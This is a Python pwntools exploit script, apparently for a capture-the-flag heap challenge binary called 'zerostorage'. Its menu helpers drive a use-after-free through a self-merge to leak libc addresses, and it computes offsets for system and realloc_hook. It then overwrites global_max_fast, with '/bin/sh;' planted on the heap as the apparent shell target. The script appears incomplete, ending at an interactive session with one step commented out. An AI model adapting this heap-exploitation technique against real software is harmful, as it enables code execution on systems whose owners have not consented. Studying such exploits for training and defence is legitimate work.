#!/usr/bin/python
from pwn13 import *


def Insert(data):
    p.sendline("1")
    print p.recvuntil(": ")
    p.sendline(str(len(data)+1))
    print p.recvuntil(": ")
    p.sendline(data)
    print p.recvuntil(": ")

def Update(idx, data):
    p.sendline("2")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")
    p.sendline(str(len(data)+1))
    print p.recvuntil(": ")
    p.sendline(data)
    print p.recvuntil(": ")

def Merge(idx1, idx2):
    p.sendline("3")
    print p.recvuntil(": ")
    p.sendline(str(idx1))
    print p.recvuntil(": ")
    p.sendline(str(idx2))
    print p.recvuntil(": ")

def Delete(idx):
    p.sendline("4")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")

def View(idx):
    p.sendline("5")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(":\n")
    data = p.recvline()
    print data
    print p.recvuntil(": ")
    return data

def List():
    p.sendline("6")
    print p.recvuntil(": ")

def Exit():
    p.sendline("7")
    print p.recv()

if __name__ == "__main__":
    p = process("./zerostorage")
    print p.recvuntil(": ")

    #leak
    Insert("a"*7)#0
    Insert("/bin/sh;")#1
    Insert("c"*7)#2
    Insert("d"*7)#3
    Insert("e"*7)#4
    Insert('f'*0x90)#5

    Delete(0)
    Merge(2,2)#
    data = View(0)

    addr1 = u64(data[:8])
    addr2 = u64(data[8:16])

    libc_base = addr2 - 0x3c3b78
    global_max_fast = libc_base + 0x3c57f8
    system_addr = libc_base + 0x45390
    realloc_hook = libc_base + 0x3c3b08
    print 'libc_base', hex(libc_base)
    print 'global_max_fast', hex(global_max_fast)
    print 'system', hex(system_addr)
    print 'realloc_hook', hex(realloc_hook)

    raw_input("1")
    Insert('g'*7)
    raw_input("2")
    Update(0, p64(0)+p64(global_max_fast-0x10))
    raw_input("3")

    Insert('h'*7)
    raw_input("4")

    #Merge(3,3)

    p.interactive()

    p.close()




